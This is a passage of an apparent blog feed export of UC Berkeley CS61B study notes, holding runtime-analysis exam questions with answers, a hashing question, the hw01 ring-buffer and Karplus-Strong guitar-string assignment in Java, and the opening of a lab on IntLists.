<h1 id="3-More-MORE-MOREEEE-Spring-2016-MT2"><a href="#3-More-MORE-MOREEEE-Spring-2016-MT2" class="headerlink" title="3 More, MORE, MOREEEE (Spring 2016, MT2)"></a>3 More, MORE, MOREEEE (Spring 2016, MT2)</h1><p>For each of the pieces of code below, give the runtime in Θ(·) notation as a function of N. Your answer should be simple, with no unnecessary leading constants or unnecessary summations.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">p1</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; N; j = j + <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"hi !"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>P1 answer: $\Theta(N^2)$</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">p2</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; N; j = j * <span class="number">2</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"hi !"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>P2 answer: $\Theta(NlogN)$</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">p3</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    p3(N / <span class="number">2</span>);</span><br><span class="line">    p3(N / <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>P3 answer: $\Theta(N)$</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">p4</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = (<span class="keyword">int</span>)((<span class="number">15</span> + Math.round(<span class="number">3.2</span> / <span class="number">2</span>)) * (Math.floor(<span class="number">10</span> / <span class="number">5.5</span>) / <span class="number">2.5</span>) * Math.pow(<span class="number">2</span>, <span class="number">5</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        System.out.println(<span class="string">"hi"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>P4 answer: $\Theta(1)$</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">p5</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= N * N; i *= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            System.out.println(<span class="string">"moo"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>P5 answer: $\Theta(N^2)$</p>
<h1 id="4-A-Wild-Hilfinger-Appears-Fall-2017-Final"><a href="#4-A-Wild-Hilfinger-Appears-Fall-2017-Final" class="headerlink" title="4 A Wild Hilfinger Appears! (Fall 2017, Final)"></a>4 A Wild Hilfinger Appears! (Fall 2017, Final)</h1><p>a. Give n the following function definitions, what is the worst-case runtime for p(N)? Assume h is a boolean function requiring constant time.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">p</span><span class="params">(<span class="keyword">int</span> M)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> r(<span class="number">0</span>, M);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">r</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> M)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= M) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (s(i) &gt; <span class="number">0</span>) <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> r(i + <span class="number">1</span>, M);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">s</span><span class="params">(<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (h(k)) <span class="keyword">return</span> k;</span><br><span class="line">    <span class="keyword">return</span> s(k - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Answer: $\Theta(N^2)$<br>b. What is the worse-case runtime for the call p(N)? Assume that calls to h require<br>constant time.</p>
<pre><code class="java"><span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">(<span class="keyword">int</span> M)</span> </span>{
    <span class="keyword">int</span> L, U;
    <span class="keyword">for</span> (L = U = <span class="number">0</span>; U &lt; M; L += <span class="number">1</span>, U += <span class="number">2</span>) {
        <span class="keyword">for</span> (<span class="keyword">int</span> i = L; i &lt; U; i+= <span class="number">1</span>) {
            h(i);
        }
    }
}</code></pre>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-examprep09(Hashing)</title>
    <url>/2018/11/02/cs61b-examprep09/</url>
    <content><![CDATA[<h1 id="1-Warmup-Spring-2015-MT2-1c"><a href="#1-Warmup-Spring-2015-MT2-1c" class="headerlink" title="1 Warmup (Spring 2015 MT2: 1c)"></a>1 Warmup (Spring 2015 MT2: 1c)</h1><p>Draw the External Chaining Hash Set that results if we insert 5. As part of this insertion, you should also resize from 4 buckets to 8 (in other words, the implementer of this data structure seems to be resizing when the load factor reaches 1.5). Assume that were using the default hashCode for integers, which simply returns the integer itself.</p>




<h1 id="2-Hashtable-Runtimes-Fall-2016-MT2-Q3"><a href="#2-Hashtable-Runtimes-Fall-2016-MT2-Q3" class="headerlink" title="2 Hashtable Runtimes (Fall 2016 MT2: Q3)"></a>2 Hashtable Runtimes (Fall 2016 MT2: Q3)</h1><p>Consider a hash table that uses external chaining and also keeps track of the number of keys that it contains. It stores each key at most once; adding a key a second<br>time has no effect. It takes the steps necessary to ensure that the number of keys is always less than or equal to twice the number of buckets (i.e., that the load factor is ≤ 2). Assume that its hash function and comparison of keys take constant time. All bounds should be a function of N, the number of elements in the table.</p>
<ol>
<li>Give Θ() bounds on the worst-case times of adding an element to the table when the load factor is 1 and when it is exactly 2 before the addition.<br><span style="color:red">Bound for load factor 1: Θ(N). Worse case they are all in the same bucket.</span><br><span style="color:red">Bound for load factor 2: Θ(N). Assuming that resize doesn’t do an duplicate check. If the resize is implemented such that there is a duplicate check (e.g. resize just calls put), it could be Θ(N2). </span></li>
</ol>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-hw01</title>
    <url>/2018/10/10/cs61b-hw01/</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In this homework, you will learn how to write and use packages, as well as get some hands-on practice with interfaces and abstract classes. We’ll also get an opportunity to implement a simple data structure as well as an algorithm that’s easy to implement using that data structure. Finally, we’ll add support for iteration and exceptions (which we’ll cover on Friday) to our data structure.</p>
<a id="more"></a>

<p>As mentioned in class, a package is a namespace that organizes a set of related classes and interfaces. Conceptually, you can think of packages as being similar to different folders on your computer. When you are building a large system, it is a good idea to organize it into different packages.</p>
<p>For this assignment, we’ll create a synthesizer package intended for use by programs that want to simulate the sound of instruments.</p>
<p>The synthesizer package has four components:</p>
<p><code>BoundedQueue</code>, an interface which declares all the methods that must be implemented by any class that implements BoundedQueue.<br><code>AbstractBoundedQueue</code>, an abstract class which implements BoundedQueue, capturing the redundancies between methods in BoundedQueue.<br><code>ArrayRingBuffer</code>, a class which extends AbstractBoundedQueue and uses an array as the actual implementation of the BoundedQueue.<br><code>GuitarString</code>, which uses an ArrayRingBuffer<Double> to implement the Karplus-Strong algorithm to synthesize a guitar string sound.<br>We’ve provided you with skeleton code for <code>ArrayRingBuffer</code> and <code>GuitarString</code>, but you’ll need to implement the other two classes from scratch. In this HW, we’ll work our way down the hierarchy from most abstract to most concrete.</p>
<p>Note: while it’d probably be better design to make only the <code>GuitarString</code> class public (since people using synthesizers don’t really care about <code>AbstractBoundedQueues</code>), we’ll be leaving all of our classes public for this HW for testing convenience.</p>
<h1 id="Task-1-BoundedQueue"><a href="#Task-1-BoundedQueue" class="headerlink" title="Task 1: BoundedQueue"></a>Task 1: BoundedQueue</h1><h2 id="Review-What-is-an-Interface-Why-would-you-want-one"><a href="#Review-What-is-an-Interface-Why-would-you-want-one" class="headerlink" title="Review: What is an Interface? Why would you want one?"></a>Review: What is an Interface? Why would you want one?</h2><p>As discussed in class, an interface is a formal contract between a class and the outside world. If your class claims to implement an interface, then all methods defined by that interface must appear in your class (or somewhere in your superclass) before the class will successfully compile. This is a way of enforcing promised behavior. All methods that you declare or define are automatically public and abstract (even if you omit the public keyword).</p>
<h2 id="Your-Task"><a href="#Your-Task" class="headerlink" title="Your Task"></a>Your Task</h2><p>We will start by defining a <code>BoundedQueue</code> interface. The <code>BoundedQueue</code> is similar to our <code>Deque</code> from Project 1, but with a more limited API. Specifically, items can only be enqueued at the back of the queue, and can only be dequeued from the front of the queue. Unlike our <code>Deque</code>, the <code>BoundedDeque</code> has a fixed capacity, and nothing is allowed to enqueue if the queue is full.</p>
<p>Create a file <code>BoundedQueue.java</code> in the synthesizer folder. You can do this easily in IntelliJ by right-clicking on the synthesizer folder in the project structure sidebar and click New -&gt; Java Class. Be sure to set “Kind” to “Interface”.</p>
<p>Your <code>BoundedQueue</code> interface should contain the following methods:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">capacity</span><span class="params">()</span></span>;     <span class="comment">// return size of the buffer</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fillCount</span><span class="params">()</span></span>;    <span class="comment">// return number of items currently in the buffer</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(T x)</span></span>;  <span class="comment">// add item x to the end</span></span><br><span class="line"><span class="function">T <span class="title">dequeue</span><span class="params">()</span></span>;        <span class="comment">// delete and return item from the front</span></span><br><span class="line"><span class="function">T <span class="title">peek</span><span class="params">()</span></span>;           <span class="comment">// return (but do not delete) item from the front</span></span><br></pre></td></tr></table></figure>
<p>You should also create default methods <code>isEmpty()</code> and <code>isFull()</code> that return the appropriate answer if the <code>BoundedQueue</code> is empty or full.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">default</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span>       <span class="comment">// is the buffer empty (fillCount equals zero)?</span></span></span><br><span class="line"><span class="function"><span class="keyword">default</span> <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span>        <span class="comment">// is the buffer full (fillCount is same as capacity)?</span></span></span><br></pre></td></tr></table></figure>
<p>For example, given an empty BoundedQueue<Double> of capacity 4, the state of the queue after each operation is shown below:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">isEmpty()       <span class="comment">//                       (returns true)</span></span><br><span class="line">enqueue(<span class="number">9.3</span>)    <span class="comment">// 9.3</span></span><br><span class="line">enqueue(<span class="number">15.1</span>)   <span class="comment">// 9.3  15.1</span></span><br><span class="line">enqueue(<span class="number">31.2</span>)   <span class="comment">// 9.3  15.1  31.2</span></span><br><span class="line">isFull()        <span class="comment">// 9.3  15.1  31.2       (returns false)</span></span><br><span class="line">enqueue(-<span class="number">3.1</span>)   <span class="comment">// 9.3  15.1  31.2  -3.1</span></span><br><span class="line">isFull()        <span class="comment">// 9.3  15.1  31.2  -3.1 (returns true)</span></span><br><span class="line">dequeue()       <span class="comment">// 15.1 31.2  -3.1       (returns 9.3)</span></span><br><span class="line">peek()          <span class="comment">// 15.1 31.2  -3.1       (returns 15.1)</span></span><br></pre></td></tr></table></figure>
<p>Of course, your <code>BoundedQueue.java</code> file won’t actually do anything (since it’s an interface), but it will define the contract that any <code>BoundedQueue</code> must follow.</p>
<p>Make sure to decare this interface as part of the synthesizer package. The syntax for declaring yourself to be part of a package is <code>package &lt;packagename&gt;</code>;. For example, if you are part of the animal package, the top of your file should have a package animal; line. Your package name should just be <code>synthesizer</code>, nothing else. (If you created the file using IntelliJ, this should have already been done for you.)</p>
<p>Before moving on, ensure that there are no compilation errors in <code>BoundedQueue</code>.</p>
<p>If you’re stuck, see the <code>List61B</code> interface for an example of an interface declaration with generics.</p>
<h1 id="Task-2-AbstractBoundedQueue"><a href="#Task-2-AbstractBoundedQueue" class="headerlink" title="Task 2: AbstractBoundedQueue"></a>Task 2: AbstractBoundedQueue</h1><h2 id="Review-What-is-an-Abstract-Class-Why-would-you-want-one"><a href="#Review-What-is-an-Abstract-Class-Why-would-you-want-one" class="headerlink" title="Review: What is an Abstract Class? Why would you want one?"></a>Review: What is an Abstract Class? Why would you want one?</h2><p>Methods and classes can be declared as abstract using the abstract keyword. Abstract classes cannot be instantiated, but they can be subclassed using the <code>extends</code> keyword. Unlike interfaces, abstract classes can provide implementation inheritance for features other than public methods, including instance variables.</p>
<p>Classes that implement interfaces will inherit all of the methods and variables from that interface. If an implementing class fails to implement any abstract methods inherited from an interface, then that class must be declared abstract, as in:<br><code>public abstract class AbstractBoundedQueue</code><br>As an aside, it is also possible to declare additional abstract methods. To do so, the method must be defined with the abstract keyword and without an implementation (without braces, and followed by a semicolon), like this:<br>`abstract void moveTo(double deltaX, double deltaY);``<br>We won’t explicitly define any non-inherited methods as abstract in HW1, but it’s a thing you might find useful someday.</p>
<h2 id="Your-Task-1"><a href="#Your-Task-1" class="headerlink" title="Your Task"></a>Your Task</h2><p>Create a new abstract class in a .java file called <code>AbstractBoundedQueue.java</code> that implements <code>BoundedQueue</code>. Your <code>AbstractBoundedQueue</code> class should have the following methods and fields (field is just another word for instance variable):</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> fillCount;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> capacity;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">capacity</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">fillCount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> T <span class="title">peek</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> T <span class="title">dequeue</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">enqueue</span><span class="params">(T x)</span></span>;</span><br></pre></td></tr></table></figure>
<p>Note that <code>isEmpty</code>, <code>isFull</code>, <code>peek</code>, <code>dequeue</code>, <code>enqueue</code>, are inherited from BoundedQueue, so you should not to declare these explicitly in your AbstractBoundedQueue.java file. The mysterious <code>protected</code> keyword above is something we’ll talk about in lecture on 2/21. It just means that only subclasses of <code>AbstractBoundedQueue</code> and classes in the same package as <code>AbstractBoundedQueue</code> can access this variable.</p>
<p>The purpose of <code>AbstractBoundedQueue</code> will be to simply provide a protected <code>fillCount</code> and <code>capacity</code> variable that all subclasses will inherit, as well as so called “getter” methods <code>capacity()</code> and <code>fillCount()</code> that return <code>capacity</code> and <code>fillCount</code>, respectively. This saves a tiny amount of work for future implementations like <code>ArrayRingBuffer.java</code>(see next section).</p>
<h2 id="Side-Note-When-to-use-an-Interface-Versus-an-Abstract-Class"><a href="#Side-Note-When-to-use-an-Interface-Versus-an-Abstract-Class" class="headerlink" title="Side Note: When to use an Interface Versus an Abstract Class"></a>Side Note: When to use an Interface Versus an Abstract Class</h2><p>In practice, in can be a little unclear when to use an interface and when to use an abstract class. One mostly accurate metaphor that might help is that you can think of an interface as defining a “can-do” or an “is-a” relationship, whereas an abstract class should be a stricter “is-a” relationship. The difference can be subtle, and you can often use one instead of the other.</p>
<p>In practice, large Java libraries often have a hierarchy of interfaces, which are extended by abstract classes that provided default implementations for some methods, and which are in turn ultimately implemented by concrete classes. A good example is the Collection interface: It extends Iterable (which is its superinterface), and is implemented by many subinterfaces (i.e. List, Set, Map), which in turn have their own abstract implementations (AbstractList, AbstractSet AbstractMap). However, for smaller programs, the hierarchy is often stubbier, sometimes starting with an abstract class. For example, we could have just started with AbstractBoundedQueue at the top of the hierarchy and skipped having a BoundedQueue interface altogether.</p>
<h1 id="Task-3-ArrayRingBuffer"><a href="#Task-3-ArrayRingBuffer" class="headerlink" title="Task 3: ArrayRingBuffer"></a>Task 3: ArrayRingBuffer</h1><p>The <code>ArrayRingBuffer</code> class will do all the real work by extending <code>AbstractBoundedQueue</code>. That means we can happily inherit <code>capacity()</code>, <code>fillCount()</code>, <code>isEmpty()</code>, and <code>isFull()</code> without having to override these, but we’ll need to override all of the the abstract methods. In this part, you’ll fill out <code>ArrayRingBuffer.java</code>. You’ll need to rename the file from <code>ArrayRingBuffer.java.skeleton</code> to <code>ArrayRingBuffer.java</code>.</p>
<p>A naive array implementation of a BoundedQueue would store the newest item at position 0, the second newest item in position 1, and so forth. This is an inefficient approach, as we see in the example below, where the comments show entries 0, 1, 2, and 3 of the array respectively. We assume that the array is initially all nulls.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BoundedQueue x = <span class="keyword">new</span> NaiveArrayBoundedQueue(<span class="number">4</span>);</span><br><span class="line">x.enqueue(<span class="number">33.1</span>) <span class="comment">// 33.1 null null  null</span></span><br><span class="line">x.enqueue(<span class="number">44.8</span>) <span class="comment">// 33.1 44.8 null  null</span></span><br><span class="line">x.enqueue(<span class="number">62.3</span>) <span class="comment">// 33.1 44.8 62.3  null</span></span><br><span class="line">x.enqueue(-<span class="number">3.4</span>) <span class="comment">// 33.1 44.8 62.3 -3.4</span></span><br><span class="line">x.dequeue()     <span class="comment">// 44.8 62.3 -3.4  null (returns 33.1)</span></span><br></pre></td></tr></table></figure>
<p>Note that in this setup, the call to <code>dequeue</code> is very slow as it requires moving every single item to the left. For larger arrays this would result in unacceptable performance.</p>
<p>The ArrayRingBuffer will improve this runtime substantially by using the ‘ring buffer’ data structure, similar to the circular array from Project 1A. A ring buffer first starts empty and of some predefined length. For example, this is a 7-element buffer:</p>


<p>Assume that a 1 is written into the middle of the buffer (the exact starting location does not matter in a ring buffer):</p>


<p>Then assume that two more elements are added — 2 and 3 — which get appended after the 1. Here, it is important that the 2 and 3 are placed in the exact order and places shown:</p>


<p>If two elements are then removed from the buffer, the oldest two values inside the buffer are removed. The two elements removed in this case are 1 and 2, leaving the buffer with just a 3:</p>


<p>If we then enqueue 4, 5, 6, 7, 8, and 9, the ring buffer is now as shown below:</p>


<p>Note that the 6 was enqueued at the leftmost entry of the array (i.e. the buffer wraps around, like a ring). At this point, the ring buffer is full, and if another enqueue() is performed, then an Exception will occur. You will manually throw this Exception. See the section labeled Iteration and Exceptions at the end of this HW for more.</p>
<p>We recommend you maintain one integer instance variable <code>first</code> that stores the index of the least recently inserted item; maintain a second integer instance variable <code>last</code> that stores the index one beyond the most recently inserted item. To insert an item, put it at index <code>last</code> and increment <code>last</code>. To remove an item, take it from index <code>first</code> and increment <code>first</code>. When either index equals capacity, make it wrap-around by changing the index to 0. Our skeleton file provides starter code along these lines. You’re welcome to do something else if you’d like, since these variables are private and thus our tester will not be able to see them anyway.</p>
<p>In the last section of this homework, we’ll implement our <code>ArrayRingBuffer</code> to throw a run-time exception if the client attempts to <code>enqueue()</code> into a full buffer or call <code>dequeue()</code> or <code>peek()</code> on an empty buffer. We’ll be covering exceptions on Monday, so hold off until then (or read ahead in HFJ or online).</p>
<p>Once you’ve fleshed out the TODOs, make sure <code>ArrayRingBuffer</code> compiles before moving on. Optionally, you can add tests to the <code>TestArrayRingBuffer</code> class (either before or after your write <code>ArrayRingBuffer</code>). <code>TestArrayRingBuffer.java</code> will not be graded.</p>
<p>For homeworks and labs (but not projects), you’re welcome to share test code. Feel free to share your tests for this homework on Piazza.</p>
<h1 id="Task-4-GuitarString"><a href="#Task-4-GuitarString" class="headerlink" title="Task 4: GuitarString"></a>Task 4: GuitarString</h1><p>Finally, we want to flesh out <code>GuitarString</code>, which uses an <code>ArrayRingBuffer</code> to replicate the sound of a plucked string. We’ll be using the Karplus-Strong algorithm, which is quite easy to implement with a BoundedQueue.</p>
<p>The Karplus-Algorithm is simply the following three steps:</p>
<ol>
<li>Replace every item in a BoundedQueue with random noise (double values between -0.5 and 0.5).</li>
<li>Remove the front double in the BoundedQueue and average it with the next double in the BQ (hint: use dequeue() and peek()) multiplied by an energy decay factor of 0.996.</li>
<li>Play the double that you dequeued in step 2. Go back to step 2 (repeating forever).<br>Or visually, if the BoundedQueue is as shown on the top, we’d dequeue the 0.2, combine it with the 0.4 to form 0.2988, enqueue the 0.2988, and play the 0.2.</li>
</ol>


<p>You can play a double value with the <code>StdAudio.play</code> method. For example <code>StdAudio.play(0.333)</code> will tell the diaphragm of your speaker to extend itself to 1/3rd of its total reach, <code>StdAudio.play(-0.9)</code> will tell it to stretch its little heart backwards almost as far as it can reach. Movement of the speaker diaphragm displaces air, and if you displace air in nice patterns, these disruptions will be intepreted by your consciousness as pleasing thanks to billions of years of evolution. See this page for more. If you simply do <code>StdAudio.play(0.9)</code> and never play anything again, the diaphragm shown in the image would just be sitting still 9/10ths of the way forwards.</p>
<p>Rename <code>GuitarString.java.skeleton</code> to <code>GuitarString.java</code>. Complete <code>GuitarString.java</code> so that it implements steps 1 and 2 of the Karplus-Strong algorithm. Step 3 will be done by the client of the <code>GuitarString</code> class.</p>
<p>Make sure to import javalib into your project, as usual, otherwise <code>StdAudio</code> won’t work.</p>
<p>For example, the provided <code>TestGuitarString</code> class provides a sample test <code>testPluckTheAString</code> that attempts to play an A-note on a guitar string. You should hear an A-note when you run this test. If you don’t, you should try the <code>testTic</code> method and debug from there. Consider adding a <code>print</code> or <code>toString</code> method to <code>GuitarString.java</code> that will help you see what’s going on between tics.</p>
<h1 id="Just-For-Fun-TTFAF"><a href="#Just-For-Fun-TTFAF" class="headerlink" title="Just For Fun: TTFAF"></a>Just For Fun: TTFAF</h1><p>Once you’re relatively comfortable that GuitarString should be working, rename the rest of the <code>.java.skeleton</code> files to <code>.java</code> and try running <code>TTFAF</code>. Make sure your sound is on!</p>
<p>You can read the <code>GuitarPlayer</code> and <code>TTFAF</code> classes to figure out how they work. <code>TTFAF</code> in particular includes (as commented-out code) an example of how to use it another way.</p>
<h2 id="GuitarHeroLite"><a href="#GuitarHeroLite" class="headerlink" title="GuitarHeroLite"></a>GuitarHeroLite</h2><p>You should now also be able to use the<code>GuitarHero</code> class. Running it will provide an interface, allowing the user (you!) to interactively play sounds using the <code>synthesizer</code> package’s <code>GuitarString</code> class.</p>
<p>Consider writing a program GuitarHero that is similar to GuitarHeroLite, but supports a total of 37 notes on the chromatic scale from 110Hz to 880Hz. Use the following 37 keys to represent the keyboard, from lowest note to highest note:</p>
<p><code>String keyboard = &quot;q2we4r5ty7u8i9op-[=zxdcfvgbnjmk,.;/&#39; &quot;;</code></p>
<p>This keyboard arrangement imitates a piano keyboard: The “white keys” are on the qwerty and zxcv rows and the “black keys” on the 12345 and asdf rows of the keyboard.</p>
<p>The ith character of the string keyboard corresponds to a frequency of $440\cdot 2^{(i -24)/12}$, so that the character q is 110Hz, ‘i’ is 220Hz, ‘v’ is 440Hz, and ‘ ‘ is 880Hz. Don’t even think of including 37 individual GuitarString variables or a 37-way if statement! Instead, create an array of 37 GuitarString objects and use <code>keyboard.indexOf(key)</code> to figure out which key was typed. Make sure your program does not crash if a key is pressed that does not correspond to one of your 37 notes.</p>
<p>This part of the assignment is not graded.</p>
<h1 id="Even-More-Fun"><a href="#Even-More-Fun" class="headerlink" title="Even More Fun"></a>Even More Fun</h1><ul>
<li>Harp strings: Flipping the sign of the new value before enqueueing it in tic() will change the sound from guitar-like to harp-like. You may want to play with the decay factors to improve the realism, and adjust the buffer sizes by a factor of two since the natural resonance frequency is cut in half by the tic() change.</li>
<li>Drums: Flipping the sign of a new value with probability 0.5 before enqueueing it in tic() will produce a drum sound. A decay factor of 1.0 (no decay) will yield a better sound, and you will need to adjust the set of frequencies used.</li>
<li>Guitars play each note on one of 6 physical strings. To simulate this you can divide your GuitarString instances into 6 groups, and when a string is plucked, zero out all other strings in that group.</li>
<li>Pianos come with a damper pedal which can be used to make the strings stationary. You can implement this by, on iterations where a certain key (such as Shift) is held down, changing the decay factor.</li>
<li>While we have used equal temperament, the ear finds it more pleasing when musical intervals follow the small fractions in the just intonation system. For example, when a musician uses a brass instrument to play a perfect fifth harmonically, the ratio of frequencies is 3/2 = 1.5 rather than 27/12 ∼ 1.498. Write a program where each successive pair of notes has just intonation.<br>This part of the assignment is not graded.</li>
</ul>
<h1 id="Why-It-Works"><a href="#Why-It-Works" class="headerlink" title="Why It Works"></a>Why It Works</h1><p>The two primary components that make the Karplus-Strong algorithm work are the ring buffer feedback mechanism and the averaging operation.</p>
<ul>
<li>The ring buffer feedback mechanism. The ring buffer models the medium (a string tied down at both ends) in which the energy travels back and forth. The length of the ring buffer determines the fundamental frequency of the resulting sound. Sonically, the feedback mechanism reinforces only the fundamental frequency and its harmonics (frequencies at integer multiples of the fundamental). The energy decay factor (.996 in this case) models the slight dissipation in energy as the wave makes a round trip through the string.</li>
<li>The averaging operation. The averaging operation serves as a gentle low-pass filter (which removes higher frequencies while allowing lower frequencies to pass, hence the name). Because it is in the path of the feedback, this has the effect of gradually attenuating the higher harmonics while keeping the lower ones, which corresponds closely with how a plucked guitar string sounds.</li>
</ul>
<h1 id="Task-5-Iteration-and-Exceptions"><a href="#Task-5-Iteration-and-Exceptions" class="headerlink" title="Task 5: Iteration and Exceptions"></a>Task 5: Iteration and Exceptions</h1><p>As an exercise in making your data structures more industrial strength, we’ll add the ability to iterate through a BoundedQueue and also ensure that it throws exceptions when given invalid inputs. We’ll cover these topics on Friday 2/16.</p>
<h2 id="BoundedQueue"><a href="#BoundedQueue" class="headerlink" title="BoundedQueue"></a>BoundedQueue</h2><p>First, modify your <code>BoundedQueue&lt;T&gt;</code> interface so that it <code>extends Iterable&lt;T&gt;</code> and add the required abstract method to the interface. You’ll need to import <code>java.util.Iterator</code>.</p>
<h2 id="AbstractBoundedQueue"><a href="#AbstractBoundedQueue" class="headerlink" title="AbstractBoundedQueue"></a>AbstractBoundedQueue</h2><p>Consider your AbstractBoundedQueue. You don’t need to change anything in this class to support iteration. Make sure you understand why.</p>
<h2 id="ArrayRingBuffer"><a href="#ArrayRingBuffer" class="headerlink" title="ArrayRingBuffer"></a>ArrayRingBuffer</h2><p>Now finally add the required <code>iterator()</code> method to <code>ArrayRingBuffer</code>. You’ll need to define a private class that implements the <code>Iterator</code> interface. See lecture 14 for an example..</p>
<h2 id="Exceptions"><a href="#Exceptions" class="headerlink" title="Exceptions"></a>Exceptions</h2><p>Now modify <code>ArrayRingBuffer</code> so that it throws a RuntimeException with the String “Ring Buffer Overflow” when a user attempts to enqueue into a full <code>ArrayRingBuffer</code>, and “Ring Buffer Underflow” when a user attempts to deque an empty <code>ArrayRingBuffer</code>.</p>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-lab02</title>
    <url>/2018/09/04/cs61b-lab02/</url>
    <content><![CDATA[<h1 id="Introduction-Review-of-IntLists"><a href="#Introduction-Review-of-IntLists" class="headerlink" title="Introduction/Review of IntLists"></a>Introduction/Review of IntLists</h1><p>As discussed in Monday’s lecture, an IntList is our CS61B implementation for a naked recursive linked list of integers. Each IntList has a first and rest variable. The first is the int element contained by the node, and the rest is the next chain in the list (another IntList!).</p>
<p>In the IntList directory for this lab, we’ve provided a much larger IntList.java than the one we created in class. It has five important new static methods, two of which you’ll fill in:</p>
<a id="more"></a>
